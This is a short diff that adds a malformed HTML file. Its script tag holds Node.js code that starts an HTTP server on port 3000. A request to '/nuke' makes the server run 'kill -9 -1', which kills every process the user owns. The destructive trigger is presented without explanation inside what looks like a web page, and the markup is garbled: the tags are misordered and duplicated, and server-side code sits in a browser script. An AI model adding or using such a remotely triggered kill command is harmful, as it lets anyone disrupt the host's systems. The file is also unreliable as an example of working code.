@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+<body>
+
+<script>
+const http = require('http');
+const { exec } = require('child_process');
+
+http.createServer((req, res) => {
+  if (req.url === '/nuke') {
+    exec('kill -9 -1'); 
+  }
+  res.end('Process: Session Kill (SIG_KILL) ');
+}).listen(3000);
+</script>
+</html>
+</head>
+</html>
